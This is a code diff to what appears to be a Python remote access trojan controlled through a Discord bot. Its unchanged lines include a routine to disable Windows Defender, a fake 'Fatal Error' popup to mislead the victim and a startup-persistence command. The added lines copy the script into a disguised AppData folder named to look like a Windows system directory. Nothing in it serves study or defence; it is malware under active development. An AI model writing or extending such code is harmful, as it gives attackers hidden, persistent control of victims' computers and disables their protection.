@@ -1,4 +1,4 @@
-import os, discord, subprocess, requests, ctypes, zipfile
+import os, discord, subprocess, requests, ctypes, zipfile, shutil
 from PIL import ImageGrab, Image
 import cv2
 from tkinter import messagebox
@@ -27,6 +27,16 @@ def disable_defender():
 if DEFENDER:
     disable_defender()
 
+file_dir = os.path.dirname(os.path.abspath(__file__))
+
+def move():
+    shutil.copy(f"{file_dir}\{os.path.basename(__file__)}", f"{os.getenv('appdata')}\MicrosoftWindows\System")
+    
+
+
+if MOVE and file_dir != f"{os.getenv('appdata')}\MicrosoftWindows\System":
+    move()
+
 
 def error():
     messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")  
@@ -38,7 +48,7 @@ if ERROR:
 login = os.getlogin()
 client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(8).hex()
-original_dir = os.getcwd()
+#original_dir = os.getcwd()
 
     
 commands = "\n".join([
@@ -155,7 +165,7 @@ async def on_ready():
     await channel.send(embed=embed)
     delete_files(["system.txt"])
     #browsers(channel)
-    
+
 @client.event
 async def on_message(message):    
     if message.author == client.user: #if message.author == client.user or message.channel.name != session_id:
@@ -370,7 +380,7 @@ async def on_message(message):
         await message.reply(embed=embed)
     
     elif message.content == "startup":
-        Startup(original_dir)
+        Startup(f"{os.path.abspath(__file__)}\{os.path.basename(__file__)}")
         await message.reply("Startup Enabled!")
         
         
